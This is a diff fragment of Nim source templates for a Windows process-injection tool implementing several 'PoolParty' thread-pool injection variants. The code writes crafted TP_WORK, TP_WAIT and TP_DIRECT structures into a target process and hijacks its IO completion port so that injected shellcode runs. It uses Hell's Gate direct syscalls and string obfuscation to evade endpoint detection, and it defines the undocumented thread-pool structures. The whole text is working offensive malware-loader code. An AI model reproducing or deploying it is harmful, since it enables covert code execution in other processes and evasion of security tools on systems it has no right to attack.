+            #targetAddress = cast[LPVOID](cast[LPVOID](workerFactoryInformation.StartParameter) + 0x1E8)
+            #success = WriteProcessMemory(pHandle,targetAddress,addr RemoteWorkItemTaskList,  sizeof(RemoteWorkItemTaskList), addr bytWritten)
+            #if(success == 0):
+            #    when defined(verbose):
+            #        echo obf("[-] Queue Entry two overwrite failed")
+            #        echo GetLastError()
+            #    quit(1)
+            
+            # and one more
+            when defined(Hellsgate):
+                if getSyscall(ntProtectTable):
+                    syscall = ntProtectTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+            targetAddress = cast[LPVOID](cast[LPVOID](workerFactoryInformation.StartParameter) + 0x1E8)
+            var oldProtect5: DWORD
+            sc_size = cast[SIZE_T](8)
+            protectAddress = targetAddress
+            status = NtProtectVirtualMemory(
+                pHandle, 
+                addr protectAddress, 
+                &sc_size, 
+                PAGE_READWRITE, 
+                addr oldProtect5)
+            
+            when defined(verbose):
+                echo obf("[*] NtProtectVirtualMemory: "), toHex(status)
+                echo obf("    \\-- old protection: "), toHex(oldProtect5)
+                echo obf("")
+
+            when defined(Hellsgate):
+                if getSyscall(ntWriteTable):
+                    syscall = ntWriteTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+
+            status = NtWriteVirtualMemory(
+                pHandle, 
+                targetAddress, 
+                addr RemoteWorkItemTaskList, 
+                8, 
+                addr bytesWritten)
+
+            when defined(verbose):
+                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
+                echo obf("    \\-- bytes written: "), bytesWritten
+                echo obf("")
+            
+            when defined(Hellsgate):
+                if getSyscall(ntProtectTable):
+                    syscall = ntProtectTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+            
+            targetAddress = cast[LPVOID](cast[LPVOID](workerFactoryInformation.StartParameter) + 0x1E8)
+            var oldProtect6: DWORD
+            sc_size = 8
+            protectAddress = targetAddress
+            status = NtProtectVirtualMemory(
+                pHandle, 
+                addr protectAddress, 
+                &sc_size, 
+                oldProtect5, 
+                addr oldProtect6)
+            
+            when defined(verbose):
+                echo obf("[*] NtProtectVirtualMemory: "), toHex(status)
+                echo obf("    \\-- old protection: "), toHex(oldProtect6)
+                echo obf("")
+            
+
+            
+            when defined(verbose):
+                echo obf("[+] Modified the target process's TP_POOL task queue list entry to point to the specially crafted TP_WORK")
+
+
+        when defined(variant3):
+            
+
+            var pTpWait: LPVOID = cast[LPVOID](CreateThreadpoolWait(cast[PTP_WAIT_CALLBACK](startPointer), nil, nil))
+            when defined(verbose):
+                echo obf("[+] Created TP_WAIT structure associated with the shellcode")
+                echo obf("------------------------------------------------------------------------------------\r\n")
+
+            #var pRemoteTpWait: PVOID
+            #pRemoteTpWait = cast[PVOID](VirtualAllocEx(pHandle, nil, 472 #[sizeof(FULL_TP_WAIT)]#, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE))
+            # use NtAllocateVirtualMemory instead
+            when defined(Hellsgate):
+                if getSyscall(ntAllocTable):
+                    syscall = ntAllocTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
+            var pRemoteTpWait: LPVOID = nil
+            var size: SIZE_T = cast[SIZE_T](472)#[sizeof(FULL_TP_WAIT)]#
+            var status: NTSTATUS = NtAllocateVirtualMemory(pHandle, addr pRemoteTpWait, 0, addr size, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
+            if(status != 0):
+                when defined(verbose):
+                    echo obf("[-] Failed to allocate memory in the target process for the specially crafted TP_WAIT structure")
+                quit(1)
+            else:
+                when defined(verbose):
+                    echo obf("[+] Allocated memory in the target process for the specially crafted TP_WAIT structure")
+            
+
+            #var bytWritten: SIZE_T = 0
+            #success = WriteProcessMemory(pHandle, pRemoteTpWait, pTpWait, 472#[sizeof(FULL_TP_WAIT)]#, addr bytWritten)
+            #if(success == 0):
+            #    when defined(verbose):
+            #        echo obf("[-] Failed to write the specially crafted TP_WAIT structure to the target process")
+            #    quit(1)
+            
+            # as above with NT functions
+            var targetAddress: LPVOID = pRemoteTpWait
+            var oldProtect: DWORD
+            var sc_size: SIZE_T = 472#[sizeof(FULL_TP_WAIT)]#
+
+            when defined(Hellsgate):
+                if getSyscall(ntWriteTable):
+                    syscall = ntWriteTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+            var bytesWritten: SIZE_T = 0
+            status = NtWriteVirtualMemory(
+                pHandle, 
+                pRemoteTpWait, 
+                pTpWait, 
+                472#[sizeof(FULL_TP_WAIT)]#, 
+                addr bytesWritten)
+
+            when defined(verbose):
+                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
+                echo obf("    \\-- bytes written: "), bytesWritten
+                echo obf("")
+            
+            #var pRemoteTpDirect: PVOID
+            #pRemoteTpDirect = cast[PVOID](VirtualAllocEx(pHandle, nil, 72#[sizeof(TP_DIRECT)]#, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE))
+            # NtAllocateVirtualMemory again
+            when defined(Hellsgate):
+                if getSyscall(ntAllocTable):
+                    syscall = ntAllocTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
+            var pRemoteTpDirect: LPVOID = nil
+            size = cast[SIZE_T](72)#[sizeof(TP_DIRECT)]#
+            status = NtAllocateVirtualMemory(pHandle, addr pRemoteTpDirect, 0, addr size, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
+            if(status != 0):
+                when defined(verbose):
+                    echo obf("[-] Failed to allocate memory in the target process for the specially crafted TP_DIRECT structure")
+                quit(1)
+            else:
+                when defined(verbose):
+                    echo obf("[+] Allocated memory in the target process for the specially crafted TP_DIRECT structure")
+
+
+            #var pTpWait_Direct: PVOID = cast[PVOID](pTpWait + 0x188)
+            #success = WriteProcessMemory(pHandle, pRemoteTpDirect, pTpWait_Direct, 72#[sizeof(TP_DIRECT)]#, addr bytWritten)
+            #if(success == 0):
+            #    when defined(verbose):
+            #        echo obf("[-] Failed to write the TP_DIRECT structure to the target process")
+            #    quit(1)
+            #else:
+            #    when defined(verbose):
+            #        echo obf("[+] Successfully written the TP_DIRECT structure to the target process")
+            
+            when defined(Hellsgate):
+                if getSyscall(ntWriteTable):
+                    syscall = ntWriteTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+            # as above with NT functions
+            targetAddress = pRemoteTpDirect
+            sc_size = cast[SIZE_T](72)#[sizeof(TP_DIRECT)]#
+            status = NtWriteVirtualMemory(
+                pHandle, 
+                pRemoteTpDirect, 
+                cast[LPVOID](pTpWait + 0x188), 
+                72#[sizeof(TP_DIRECT)]#, 
+                addr bytesWritten)
+
+            when defined(verbose):
+                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
+                echo obf("    \\-- bytes written: "), bytesWritten
+                echo obf("")
+
+
+
+            var p_hEvent: HANDLE = CreateEvent(nil, FALSE, FALSE, "PoolParty")
+            if(p_hEvent == 0):
+                when defined(verbose):
+                    echo obf("[-] Failed to create event with name `PoolPartyEvent`")
+                when defined(verbose):
+                    echo GetLastError()
+                quit(1)
+            
+            var pTpWaitWaitPkt: LPVOID = cast[LPVOID](cast[LPVOID](pTpWait + 0x170)#[waitPkt offset]#)
+            var testHandle: HANDLE
+            var testHandleAddr: ptr HANDLE = addr testHandle
+            # copyMem from pTpWaitWaitPkt to testHandleAddr
+            copyMem(cast[LPVOID](addr testHandle), pTpWaitWaitPkt, 8)
+            var m_p_hIoCompletion: HANDLE = HijackProcessHandle("IoCompletion", pHandle, IO_COMPLETION_ALL_ACCESS)
+            if (m_p_hIoCompletion == 0):
+                when defined(verbose):
+                    echo obf("[-] Failed to hijack the IO completion port of the target process worker factory")
+                quit(1)
+            else:
+                when defined(verbose):
+                    echo obf("[+] Hijacked the IO completion port of the target process worker factory")
+            
+            when defined(Hellsgate):
+                if getSyscall(zwAssociateWaitCompletionPacketTable):
+                    syscall = zwAssociateWaitCompletionPacketTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for ZwAssociateWaitCompletionPacket")
+            
+            var ulongValue: ULONG = 0
+            var ulongPtr: ULONG_PTR = cast[ULONG_PTR](addr ulongValue)
+            var booleanValue: BOOLEAN = 0
+            var booleanPointer: PBOOLEAN = cast[PBOOLEAN](addr booleanValue)
+            status = ZwAssociateWaitCompletionPacket(cast[HANDLE](testHandle), m_p_hIoCompletion, p_hEvent, pRemoteTpDirect, pRemoteTpWait, 0, ulongPtr, booleanPointer)
+            
+            if(status != 0):
+                when defined(verbose):
+                    echo obf("[-] Failed to associate event with the IO completion port of the target process worker factory")
+                when defined(verbose):
+                    echo toHex(status)
+                quit(1)
+            else:
+                when defined(verbose):
+                    echo obf("[+] Associated event with the IO completion port of the target process worker factory")
+            
+            success = SetEvent(p_hEvent)
+            if(success == 0):
+                when defined(verbose):
+                    echo obf("[-] Failed to set event to queue a packet to the IO completion port of the target process worker factory")
+                quit(1)
+            else:
+                when defined(verbose):
+                    echo obf("[+] Set event to queue a packet to the IO completion port of the target process worker factory")
+
+
+
+        when defined(variant4):
+            
+            var m_p_hIoCompletion: HANDLE = HijackProcessHandle("IoCompletion", pHandle, IO_COMPLETION_ALL_ACCESS)
+            if (m_p_hIoCompletion == 0):
+                when defined(verbose):
+                    echo obf("[-] Failed to hijack the IO completion port of the target process worker factory")
+                quit(1)
+            else:
+                when defined(verbose):
+                    echo obf("[+] Hijacked the IO completion port of the target process worker factory")
+            var Direct : TP_DIRECT
+            # print sizeof TP_DIRECT
+            
+            Direct.Callback = cast[PTP_WIN32_IO_CALLBACK](startPointer)
+
+            #var RemoteDirectAddress: LPVOID
+            #RemoteDirectAddress = cast[LPVOID](VirtualAllocEx(pHandle, nil, 72#[sizeof(TP_DIRECT)]#, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE))
+            # use NtAllocateVirtualMemory instead
+            when defined(Hellsgate):
+                if getSyscall(ntAllocTable):
+                    syscall = ntAllocTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
+            var RemoteDirectAddress: LPVOID = nil
+            var size: SIZE_T = cast[SIZE_T](72)#[sizeof(TP_DIRECT)]#
+            var status: NTSTATUS = NtAllocateVirtualMemory(pHandle, addr RemoteDirectAddress, 0, addr size, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
+            if(status != 0):
+                when defined(verbose):
+                    echo obf("[-] Failed to allocate memory in the target process for the specially crafted TP_DIRECT structure")
+                quit(1)
+            else:
+                when defined(verbose):
+                    echo obf("[+] Allocated memory in the target process for the specially crafted TP_DIRECT structure")
+            
+            #var bytWritten: SIZE_T = 0
+            #success = WriteProcessMemory(pHandle, RemoteDirectAddress, addr Direct, 72#[sizeof(TP_DIRECT)]#, addr bytWritten)
+            #if(success == 0):
+            #    when defined(verbose):
+            #        echo obf("Failed to write the TP_DIRECT structure to the target process")
+            #    quit(1)
+            
+            # as above with NT functions
+
+            var targetAddress: LPVOID = RemoteDirectAddress
+            var oldProtect: DWORD
+            var sc_size: SIZE_T = 72#[sizeof(TP_DIRECT)]#
+
+            when defined(Hellsgate):
+                if getSyscall(ntWriteTable):
+                    syscall = ntWriteTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+            var bytesWritten: SIZE_T = 0
+            status = NtWriteVirtualMemory(
+                pHandle, 
+                RemoteDirectAddress, 
+                addr Direct, 
+                72#[sizeof(TP_DIRECT)]#, 
+                addr bytesWritten)
+
+            when defined(verbose):
+                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
+                echo obf("    \\-- bytes written: "), bytesWritten
+                echo obf("")
+            
+            when defined(Hellsgate):
+                if getSyscall(zwSetIoCompletionTable):
+                    syscall = zwSetIoCompletionTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for ZwSetIoCompletion")
+
+            var ulongValue: ULONG = 0
+            var ulongPtr: ULONG_PTR = cast[ULONG_PTR](addr ulongValue)
+            status = ZwSetIoCompletion(m_p_hIoCompletion, RemoteDirectAddress, nil, 0, ulongPtr)
+            if(status != 0):
+                when defined(verbose):
+                    echo obf("[-] Failed to queue a packet to the IO completion port of the target process worker factory")
+                    echo toHex(status)
+                quit(1)
+            else:
+                when defined(verbose):
+                    echo obf("[+] Queued a packet to the IO completion port of the target process worker factory")
+        
+
+"""
+
+
+let PoolpartyTypeDefs* = """
+
+
+
+type PROCESS_HANDLE_TABLE_ENTRY_INFO* = object
+    HandleValue: HANDLE
+    HandleCount: ULONG_PTR
+    PointerCount: ULONG_PTR
+    GrantedAccess: ACCESS_MASK
+    ObjectTypeIndex: ULONG
+    HandleAttributes: ULONG
+    Reserved: ULONG
+
+
+type PROCESS_HANDLE_SNAPSHOT_INFORMATION* = object
+    NumberOfHandles: ULONG_PTR
+    Reserved: ULONG_PTR
+    Handles: array[0..0, PROCESS_HANDLE_TABLE_ENTRY_INFO] 
+
+
+type PPROCESS_HANDLE_SNAPSHOT_INFORMATION* = ptr PROCESS_HANDLE_SNAPSHOT_INFORMATION
+
+var ProcessHandleInformation*: PROCESS_INFORMATION_CLASS = 51
+
+
+type WORKER_FACTORY_BASIC_INFORMATION* = object
+    Timeout: LARGE_INTEGER
+    RetryTimeout: LARGE_INTEGER
+    IdleTimeout: LARGE_INTEGER
+    Paused: BOOLEAN
+    TimerSet: BOOLEAN
+    QueuedToExWorker: BOOLEAN
+    MayCreate: BOOLEAN
+    CreateInProgress: BOOLEAN
+    InsertedIntoQueue: BOOLEAN
+    Shutdown: BOOLEAN
+    BindingCount: ULONG
+    ThreadMinimum: ULONG
+    ThreadMaximum: ULONG
+    PendingWorkerCount: ULONG
+    WaitingWorkerCount: ULONG
+    TotalWorkerCount: ULONG
+    ReleaseCount: ULONG
+    InfiniteWaitGoal: LONGLONG
+    StartRoutine: PVOID
+    StartParameter: PVOID
+    ProcessId: HANDLE
+    StackReserve: SIZE_T
+    StackCommit: SIZE_T
+    LastThreadCreationStatus: NTSTATUS
+
+type PWORKER_FACTORY_BASIC_INFORMATION* = ptr WORKER_FACTORY_BASIC_INFORMATION
+
+type PUBLIC_OBJECT_TYPE_INFORMATION* = object
+    TypeName: UNICODE_STRING
+    Reserved: array[22, ULONG]
+
+type PPUBLIC_OBJECT_TYPE_INFORMATION* = ptr PUBLIC_OBJECT_TYPE_INFORMATION
+
+
+type TP_TASK_CALLBACKS* = object
+    ExecuteCallback: PVOID
+    Unposted: PVOID
+
+type PTP_TASK_CALLBACKS* = ptr TP_TASK_CALLBACKS
+
+type TP_TASK* = object
+    Callbacks: PTP_TASK_CALLBACKS
+    NumaNode: UINT32
+    IdealProcessor: UINT8
+    Padding_242: array[3, char]
+    ListEntry: LIST_ENTRY
+
+type PTP_TASK* = ptr TP_TASK # PTP_TASK_CALLBACKS
+
+type TPP_REFCOUNT* = object
+    Refcount: INT32
+
+type PTPP_REFCOUNT* = ptr TPP_REFCOUNT
+
+type TPP_CALLER* = object
+    ReturnAddress: PVOID
+
+type PTPP_CALLER* = ptr TPP_CALLER
+
+type TPP_PH_LINKS* = object
+    Siblings: LIST_ENTRY
+    Children: LIST_ENTRY
+    Key: INT64
+
+type PTPP_PH_LINKS* = ptr TPP_PH_LINKS
+
+type TPP_PH* = object
+    Root: PTPP_PH_LINKS
+
+type PTPP_PH* = ptr TPP_PH
+
+type TP_DIRECT* = object
+    Task: TP_TASK
+    Lock: UINT64
+    IoCompletionInformationList: LIST_ENTRY
+    Callback: PVOID
+    NumaNode: UINT32
+    IdealProcessor: UINT8
+    Padding_242: array[3, char]
+
+type PTP_DIRECT* = ptr TP_DIRECT
+
+type TPP_TIMER_SUBQUEUE* = object
+    Expiration: INT64
+    WindowStart: TPP_PH
+    WindowEnd: TPP_PH
+    Timer: PVOID
+    TimerPkt: PVOID
+    Direct: TP_DIRECT
+    ExpirationWindow: UINT32
+    Padding_242: array[1, INT32]
+
+type PTPP_TIMER_SUBQUEUE* = ptr TPP_TIMER_SUBQUEUE
+
+type TPP_TIMER_QUEUE* = object
+    Lock: RTL_SRWLOCK
+    AbsoluteQueue: TPP_TIMER_SUBQUEUE
+    RelativeQueue: TPP_TIMER_SUBQUEUE
+    AllocatedTimerCount: INT32
+    Padding_242: array[1, INT32]
+
+type PTPP_TIMER_QUEUE* = ptr TPP_TIMER_QUEUE
+
+type TPP_NUMA_NODE* = object
+    WorkerCount: INT32
+
+type PTPP_NUMA_NODE* = ptr TPP_NUMA_NODE
+
+type TPP_POOL_QUEUE_STATE* = object
+    Exchange: INT64
+    RunningThreadGoal: INT32
+    PendingReleaseCount: UINT32
+    QueueLength: UINT32
+
+type PTPP_POOL_QUEUE_STATE* = ptr TPP_POOL_QUEUE_STATE
+
+type TPP_QUEUE* = object
+    Queue: LIST_ENTRY
+    Lock: RTL_SRWLOCK
+
+type PTPP_QUEUE* = ptr TPP_QUEUE
+
+type FULL_TP_POOL* = object
+    Refcount: TPP_REFCOUNT
+    Padding_239: clong
+    QueueState: TPP_POOL_QUEUE_STATE
+    TaskQueue: array[3, PTPP_QUEUE]
+    NumaNode: PTPP_NUMA_NODE
+    ProximityInfo: PGROUP_AFFINITY
+    WorkerFactory: PVOID
+    CompletionPort: PVOID
+    Lock: RTL_SRWLOCK
+    PoolObjectList: LIST_ENTRY
+    WorkerList: LIST_ENTRY
+    TimerQueue: TPP_TIMER_QUEUE
+    ShutdownLock: RTL_SRWLOCK
+    ShutdownInitiated: UINT8
+    Released: UINT8
+    PoolFlags: UINT16
+    Padding_240: clong
+    PoolLinks: LIST_ENTRY
+    AllocCaller: TPP_CALLER
+    ReleaseCaller: TPP_CALLER
+    AvailableWorkerCount: INT32
+    LongRunningWorkerCount: INT32
+    LastProcCount: UINT32
+    NodeStatus: INT32
+    BindingCount: INT32
+    CallbackChecksDisabled: UINT32
+    TrimTarget: UINT32
+    TrimmedThrdCount: UINT32
+    SelectedCpuSetCount: UINT32
+    Padding_241: clong
+    TrimComplete: RTL_CONDITION_VARIABLE
+    TrimmedWorkerList: LIST_ENTRY
+
+type PFULL_TP_POOL* = ptr FULL_TP_POOL
+
+
+type TPP_ITE_WAITER* = object
+    Next: ptr TPP_ITE_WAITER
+    ThreadId: PVOID
+
+type PTPP_ITE_WAITER* = ptr TPP_ITE_WAITER
+
+type TPP_ITE* = object
+    First: PTPP_ITE_WAITER
+
+type PTPP_ITE* = ptr TPP_ITE
+
+type TPP_FLAGS_COUNT* = object
+    Count: UINT64
+    Flags: UINT64
+    Data: INT64
+
+type TPP_BARRIER* = object
+    Ptr: TPP_FLAGS_COUNT
+    WaitLock: RTL_SRWLOCK
+    WaitList: TPP_ITE
+
+
+type
+  ALPC_WORK_ON_BEHALF_TICKET* = object
+    ThreadId: UINT32
+    ThreadCreationTimeLow: UINT32
+
+
+
+type
+  TPP_CLEANUP_GROUP_MEMBER_CALLBACK_PROC* = distinct proc (Member: PTPP_CLEANUP_GROUP_MEMBER)
+  PTPP_CLEANUP_GROUP_MEMBER_CALLBACK* = ptr TPP_CLEANUP_GROUP_MEMBER_CALLBACK_PROC
+  TPP_CLEANUP_GROUP_MEMBER_VFUNCS* = object
+    CallbackEpilog: ptr PTPP_CLEANUP_GROUP_MEMBER_CALLBACK
+    StopCallbackGeneration: PTPP_CLEANUP_GROUP_MEMBER_CALLBACK
+    CancelPendingCallbacks: PTPP_CLEANUP_GROUP_MEMBER_CALLBACK
+  TPP_CLEANUP_GROUP_MEMBER* = object
+    Refcount: TPP_REFCOUNT
+    Padding_233: cint
+    VFuncs: ptr TPP_CLEANUP_GROUP_MEMBER_VFUNCS
+    CleanupGroup: PTP_CLEANUP_GROUP
+    CleanupGroupCancelCallback: PVOID
+    FinalizationCallback: PVOID
+    CleanupGroupMemberLinks: LIST_ENTRY
+    CallbackBarrier: TPP_BARRIER
+    Callback: PVOID
+    WorkCallback: PVOID
+    SimpleCallback: PVOID
+    TimerCallback: PVOID
+    WaitCallback: PVOID
+    IoCallback: PVOID
+    AlpcCallback: PVOID
+    AlpcCallbackEx: PVOID
+    JobCallback: PVOID
+    Context: PVOID
+    ActivationContext: ptr ACTIVATION_CONTEXT
+    SubProcessTag: PVOID
+    ActivityId: GUID
+    WorkOnBehalfTicket: ALPC_WORK_ON_BEHALF_TICKET
+    RaceDll: PVOID
+    Pool: PFULL_TP_POOL
+    PoolObjectLinks: LIST_ENTRY
+    Flags: INT32
+    LongFunction: UINT32
+    Persistent: UINT32
+    UnusedPublic: UINT32
+    Released: UINT32
+    CleanupGroupReleased: UINT32
+    InCleanupGroupCleanupList: UINT32
+    UnusedPrivate: UINT32
+    Padding_234: cint
+    AllocCaller: TPP_CALLER
+    ReleaseCaller: TPP_CALLER
+    CallbackPriority: TP_CALLBACK_PRIORITY
+    Padding_242: array[1, INT32]
+  PTPP_CLEANUP_GROUP_MEMBER* = ptr TPP_CLEANUP_GROUP_MEMBER
+
+#type
+#  TPP_CLEANUP_GROUP_MEMBER_CALLBACK* = TPP_CLEANUP_GROUP_MEMBER_CALLBACK_PROC
+
+
+
+type TPP_WORK_STATE* = object
+    Exchange: INT32
+    Insertable: UINT32
+    PendingCallbackCount: UINT32
+
+type FULL_TP_WORK* = object
+    CleanupGroupMember: TPP_CLEANUP_GROUP_MEMBER
+    Task: TP_TASK
+    WorkState: TPP_WORK_STATE
+    Padding_242: array[1, INT32]
+
+type PFULL_TP_WORK* = ptr FULL_TP_WORK
+
+const WORKER_FACTORY_RELEASE_WORKER* = 0x0001
+const WORKER_FACTORY_WAIT* = 0x0002
+const WORKER_FACTORY_SET_INFORMATION* = 0x0004
+const WORKER_FACTORY_QUERY_INFORMATION* = 0x0008
+const WORKER_FACTORY_READY_WORKER* = 0x0010
+const WORKER_FACTORY_SHUTDOWN* = 0x0020
+const WORKER_FACTORY_ALL_ACCESS* = STANDARD_RIGHTS_REQUIRED or WORKER_FACTORY_RELEASE_WORKER or WORKER_FACTORY_WAIT or WORKER_FACTORY_SET_INFORMATION or WORKER_FACTORY_QUERY_INFORMATION or WORKER_FACTORY_READY_WORKER or WORKER_FACTORY_SHUTDOWN
+
+type SET_WORKERFACTORYINFOCLASS* = enum
+    WorkerFactoryTimeout = 0
+    WorkerFactoryRetryTimeout = 1
+    WorkerFactoryIdleTimeout = 2
+    WorkerFactoryBindingCount = 3
+    WorkerFactoryThreadMinimum = 4
+    WorkerFactoryThreadMaximum = 5
+    WorkerFactoryPaused = 6
+    WorkerFactoryAdjustThreadGoal = 8
+    WorkerFactoryCallbackType = 9
+    WorkerFactoryStackInformation = 10
+    WorkerFactoryThreadBasePriority = 11
+    WorkerFactoryTimeoutWaiters = 12
+    WorkerFactoryFlags = 13
+    WorkerFactoryThreadSoftMaximum = 14
+    WorkerFactoryMaxInfoClass = 15 # Not implemented
+
+type PSET_WORKERFACTORYINFOCLASS* = ptr SET_WORKERFACTORYINFOCLASS
+
+type QUERY_WORKERFACTORYINFOCLASS* = enum
+    WorkerFactoryBasicInformation2 = 7
+
+type PQUERY_WORKERFACTORYINFOCLASS* = ptr QUERY_WORKERFACTORYINFOCLASS
+
+
+proc NtQueryInformationWorkerFactory*(hWorkerFactory: HANDLE, WorkerFactoryInformationClass: QUERY_WORKERFACTORYINFOCLASS, WorkerFactoryInformation: PVOID, WorkerFactoryInformationLength: ULONG, ReturnLength: PULONG): NTSTATUS {.importc: "NtQueryInformationWorkerFactory", dynlib: "ntdll.dll".}
+#proc NtSetInformationWorkerFactory*(WorkerFactoryHandle: HANDLE, WorkerFactoryInformationClass: SET_WORKERFACTORYINFOCLASS, WorkerFactoryInformation: PVOID, WorkerFactoryInformationLength: ULONG): NTSTATUS {.importc: "NtSetInformationWorkerFactory", dynlib: "ntdll.dll".}
+when defined(variant2):
+    proc CreateThreadpoolWork*(pWorkCallback: PTP_WORK_CALLBACK, pWorkContext: PVOID, pCallbackEnviron: PTP_CALLBACK_ENVIRON): PFULL_TP_WORK {.importc: "CreateThreadpoolWork", dynlib: "kernel32.dll".}
+#when defined(variant3):
+#    proc ZwAssociateWaitCompletionPacket*(WaitCopmletionPacketHandle: HANDLE, IoCompletionHandle: HANDLE, TargetObjectHandle: HANDLE, KeyContext: PVOID, ApcContext: PVOID, IoStatus: NTSTATUS, IoStatusInformation: ULONG_PTR, AlreadySignaled: PBOOLEAN): NTSTATUS {.importc: "ZwAssociateWaitCompletionPacket", dynlib: "ntdll.dll".}
+#when defined(variant4):
+#    proc ZwSetIoCompletion*(IoCompletionHandle: HANDLE, KeyContext: PVOID, ApcContext: PVOID, IoStatus: NTSTATUS, IoStatusInformation: ULONG_PTR): NTSTATUS {.importc: "ZwSetIoCompletion", dynlib: "ntdll.dll".}
+
+# import wcscmp from MSVCRT
+proc wcscmp*(s1: PWSTR, s2: PWSTR): cint {.importc: "wcscmp", dynlib: "msvcrt.dll".}
+# import realloc from MSVCRT
+proc realloc*(inputPointer: PVOID, size: SIZE_T): PVOID {.importc: "realloc", dynlib: "msvcrt.dll".}
 
 """
